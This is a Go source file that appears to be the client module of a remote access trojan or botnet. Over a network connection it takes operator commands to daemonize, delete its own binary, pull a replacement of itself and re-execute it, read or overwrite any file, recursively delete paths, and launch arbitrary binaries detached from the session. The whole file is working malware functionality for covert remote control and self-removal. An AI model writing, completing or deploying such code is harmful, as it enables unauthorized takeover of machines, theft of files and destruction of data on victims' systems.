// +build extra

package base

import (
	"net"
//	"io"
	"os"
	"os/exec"
	"syscall"
//	"sync"
//	"time"
//	"runtime"
//	"crypto/rand"
	"bytes"
	"io/ioutil"

	kit "../toolkit"
	"../smux"
	"../godaemon"
)

func init() {
	RegOps(B_dodaemon, ccX)
	RegOps(B_apoptosis, ccX)
	RegOps(B_rebirth, ccX)
	RegOps(B_evolution, ccX)

	RegOps(B_fs, ccFs)

	RegInit(extraInit)
}

var extraInit = func(c *Client) {
	loadSelf(c)

	if c.Daemon {
		godaemon.MakeDaemon(&godaemon.DaemonAttr{})

		if c.AutoClean {
			cleanSelf()
		}
	}
}

var ccX = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
	switch op {
	case B_reconn:
		mux.Close()

	case B_kill:
		os.Exit(0)

	case B_dodaemon:
		godaemon.MakeDaemon(&godaemon.DaemonAttr{})

	case B_apoptosis:
		cleanSelf()

	case B_evolution:
		//kit.WriteVLen(p1, int64(0))
		fhb, err := kit.ReadVTagByte(p1)
		if err != nil {
//fmt.Println("[evolution][err]fhb", err)
			break
		}

		fb, err := kit.ReadVTagByte(p1)
		if err != nil {
//fmt.Println("[evolution][err]fb", err)
			break
		}

		checkb := kit.HashBytes256(fb)
//fmt.Println("[evolution]", len(fb), kit.Hex(checkb), kit.Hex(fhb))
		if !bytes.Equal(checkb, fhb) {
//fmt.Println("[evolution][err]!bytes.Equal", kit.Hex(checkb), kit.Hex(fhb))
			break
		}

		c.selfbyte = fb
		c.selfhex = fhb
		fallthrough

	case B_rebirth:
		dumpSelf(c)
	}
}

var ccFs = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
//	kit.WriteVLen(p1, int64(-2))

	op2, err := kit.ReadTagStr(p1)
	if err != nil {
		return
	}

	switch op2 {
	case B_get:
		fp, err := kit.ReadVTagByte(p1)
		if err != nil {
			break
		}
		fd, err := os.OpenFile(string(fp), os.O_RDONLY, 0444)
		if err != nil {
			// can't open file
			break
		}
		defer fd.Close()
		finfo, err := fd.Stat()
		if err != nil {
			// can't stat file
			break
		}
		kit.WriteVLen(p1, finfo.Size())
		kit.Cp1(fd, p1)

	case B_push:
		fp, err := kit.ReadVTagByte(p1)
		if err != nil {
			break
		}
		fd, err := os.OpenFile(string(fp), os.O_WRONLY | os.O_CREATE | os.O_TRUNC , 0700)
		if err != nil {
			// can't create file
			return
		}
		defer fd.Close()
		kit.Cp1(p1, fd)

	case B_del:
		fp, err := kit.ReadVTagByte(p1)
		if err != nil {
			kit.WriteVLen(p1, int64(-1))
			break
		}
		err = os.RemoveAll(string(fp))
		if err != nil {
			kit.WriteVLen(p1, int64(-1))
			break
		}
		kit.WriteVLen(p1, int64(0))

	case B_call:
		fpb, err := kit.ReadVTagByte(p1)
		if err != nil {
			break
		}

		fp := string(fpb)
		// check exist?
		if _, err := os.Stat(fp); os.IsNotExist(err) {
			kit.WriteVLen(p1, int64(-2))
			return
		} else {
			kit.WriteVLen(p1, int64(0))
		}
		call(p1, fp)
	}

}

var call = func (p1 net.Conn, bin string) {
	// call payload
	pl := exec.Command(bin)
	pl.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true,
//		Noctty: true,
	}
	err := pl.Start()
	if err != nil {
		p1.Write([]byte(err.Error()))
		return
	}
	err = pl.Process.Release()
	if err != nil {
		p1.Write([]byte(err.Error()))
	}
}

var cleanSelf = func () {
	name, err := kit.GetSelf()
	if err != nil {
		return
	}
	os.Remove(name)
}

var loadSelf = func (c *Client) {
	fd, err := os.OpenFile("/proc/self/exe", os.O_RDONLY, 0400)
	if err != nil {
//fmt.Println("[err]os.OpenFile", err)
		return
	}
	defer fd.Close()

	b, err := ioutil.ReadAll(fd)
	if err != nil {
		c.selfbyte = nil
		return
	}

	c.selfhex = kit.HashBytes256(b)
	c.selfbyte = b
}

var dumpSelf = func (c *Client) {
	ofd, ofp, err := kit.TryWX()
	if err != nil {
//fmt.Println("[err]TryWX()", err)
		return
	}

	if c.selfbyte == nil {
		return
	}

	ofd.Write(c.selfbyte)
	ofd.Sync()
	ofd.Close()

	pl := exec.Command(ofp)
	pl.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true,
//		Noctty: true,
	}
	err = pl.Start()
	if err != nil {
//fmt.Println("[err]pl.Start()", err)
		return
	}
	pl.Process.Release()
	os.Exit(0)
}

